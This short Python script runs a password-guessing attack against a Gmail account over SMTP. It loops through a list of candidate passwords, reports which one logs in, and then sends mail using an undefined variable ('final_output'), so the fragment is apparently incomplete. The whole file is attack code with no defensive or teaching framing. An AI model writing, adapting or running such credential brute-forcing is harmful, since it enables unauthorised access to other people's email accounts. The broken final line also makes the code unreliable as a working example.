import smtplib
from termcolor import colored



server = smtplib.SMTP("smtp.gmail.com",587)
server.ehlo()
server.starttls()

email_id = "temp@gmail.com"
passwrd_list = ["temo", "temp", "pemt"]


for passwrd in passwrd_list:
    try:
        server.login(email_id, passwrd)
        print(colored("Password found %s" % passwrd, 'green'))
    except smtplib.SMTPAuthenticationError as smtpError:
        print(colored("Incorrect Password " + passwrd, 'red'))




server.sendmail(email_id,email_id, final_output)
server.quit()